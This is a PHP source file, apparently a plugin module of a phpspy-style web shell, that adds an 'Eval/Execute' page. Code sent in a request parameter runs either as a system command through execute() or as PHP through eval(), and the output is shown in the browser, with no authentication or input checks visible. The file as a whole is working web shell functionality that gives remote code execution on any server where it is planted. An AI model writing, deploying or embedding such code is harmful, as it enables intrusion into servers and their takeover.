<?php
$tText = 'Execute';
$code =
<<<'EOD'
    $sBuff .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
    $code = @trim($p['c']);
    if ($code){
		if (isset($p['e'])){
			/*$locale = 'en_GB.utf-8';
			setlocale(LC_ALL, $locale);
			putenv('LC_ALL='.$locale);*/
			$buf = execute($code, true);
			$sBuff .= "<br><b>" . tText('ev4', 'Execute via') . ": </b>{$buf[1]}";
			if (isset($p['dta'])) 
				$sBuff .= "<br><textarea class='bigarea' readonly>{$buf[0]}</textarea><br>";
			else 
				$sBuff .= "<br><pre>{$buf[0]}</pre><br>";
		} else {
			if (!preg_match('#<\?#si', $code)) 
				$code = "<?php\n\n{$code}\n\n?>";

			//hago esta chapuzada para que no se muestre el resultado arriba
			echo 'Result of the executed code:';
			$buf = ob_get_contents();

			if ($buf){
				ob_clean();
				eval("?" . ">{$code}");
				$ret = ob_get_contents();
				$ret = convert_cyr_string($ret, 'd', 'w');
				ob_clean();
				$sBuff .= $buf;
				
				if (isset($p['dta'])) 
					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
				else 
					$sBuff .= "<br><pre>{$ret}</pre>";
			} else
				eval("?" . ">{$code}");
        }
    }

    $sBuff .= '<form>
	<textarea class="bigarea" name="c">' . (isset($p['c']) ? hsc($p['c']) : '') . '</textarea></p>
	<p>' . tText('ev1', 'Display in text-area') . ': ' . mCheck('dta', '1', '', isset($p['dta'])) . '&nbsp;&nbsp;
	' . tText('execute', 'Execute') . ': ' . mCheck('e', '1', '', isset($p['e'])) . '&nbsp;&nbsp;
	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ ' . tText('ev3', 'Get examples') . ' ]</a>
	<br><br>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') . '</p>
	' . mHide('me', 'execute') . '
	</form>';
EOD;
